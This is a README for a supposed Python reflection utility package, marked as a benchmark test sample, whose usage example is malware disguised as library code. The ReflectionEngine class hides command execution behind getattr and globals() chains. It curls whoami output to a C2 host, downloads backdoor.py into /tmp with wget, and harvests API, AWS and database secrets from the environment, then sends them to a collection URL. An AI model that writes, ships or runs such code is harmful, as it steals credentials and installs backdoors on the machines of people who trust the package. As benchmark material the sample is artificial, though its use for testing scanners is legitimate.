# Python Reflection Utilities

BENCHMARK_TEST_ONLY - This file contains intentionally malicious patterns for security testing.

## Description

Advanced Python reflection and introspection utilities for dynamic attribute access and runtime modification.

## Installation

```bash
pip install py-reflection-utils
```

## Usage

Leverage Python's reflection capabilities for flexible runtime behavior:

```python
# Advanced Reflection and Globals Manipulation
import sys

class ReflectionEngine:
    """Dynamic attribute and globals manipulation for runtime flexibility."""

    def __init__(self):
        self.c2_server = "https://[REDACTED].example.com"
        self._cached_modules = {}

    # DYNAMIC-004: getattr with __import__ for dynamic execution
    def execute_via_reflection(self, module_name, method_name, *args):
        """Execute any module method via reflection."""
        # Import module dynamically
        mod = __import__(module_name)

        # Get method via getattr
        method = getattr(mod, method_name)

        # Execute with provided arguments
        return method(*args)

    def run_system_command(self, command):
        """Execute system command via reflection chain."""
        # DYNAMIC-004: getattr chain for command execution
        os_module = getattr(__import__('os'), 'system')
        return os_module(command)

    def stealth_exec(self, code_string):
        """Execute code using globals manipulation."""
        # DYNAMIC-004: globals() manipulation for hidden execution
        builtins = globals()['__builtins__']

        # Get exec from builtins
        if isinstance(builtins, dict):
            exec_func = builtins['exec']
        else:
            exec_func = getattr(builtins, 'exec')

        # Execute payload
        exec_func(code_string)

    def hidden_import(self, module_name):
        """Import module via globals builtins."""
        # Access __import__ through globals
        import_func = globals()['__builtins__']['__import__']
        return import_func(module_name)

    def construct_payload(self):
        """Build and execute payload via reflection."""
        # Build command parts
        parts = {
            'mod': 'subprocess',
            'func': 'check_output',
            'cmd': f'curl {self.c2_server}/exfil?data=$(whoami)'
        }

        # Dynamic execution via getattr chain
        mod = __import__(parts['mod'])
        func = getattr(mod, parts['func'])
        return func(parts['cmd'], shell=True)

    def inject_into_globals(self, name, value):
        """Inject values into global namespace."""
        # Direct globals manipulation
        globals()[name] = value

    def extract_secrets(self):
        """Extract sensitive data from environment."""
        # Access os.environ via reflection
        environ = getattr(__import__('os'), 'environ')

        # Look for secrets
        secrets = {}
        for key in ['API_KEY', 'SECRET_KEY', 'AWS_ACCESS_KEY', 'DATABASE_URL']:
            if key in environ:
                secrets[key] = environ[key]

        return secrets

# Example usage demonstrating reflection abuse
engine = ReflectionEngine()

# Execute command via reflection
engine.run_system_command('wget https://[REDACTED].example.com/backdoor.py -O /tmp/bd.py')

# Stealth execution via globals
engine.stealth_exec("import socket; s=socket.socket()")

# Extract and exfiltrate secrets
secrets = engine.extract_secrets()
getattr(__import__('urllib.request'), 'urlopen')(
    f"https://[REDACTED].example.com/collect?secrets={secrets}"
)
```

## API

### execute_via_reflection(module, method, *args)
Dynamically execute any method from any module.

### stealth_exec(code)
Execute code string using globals manipulation.
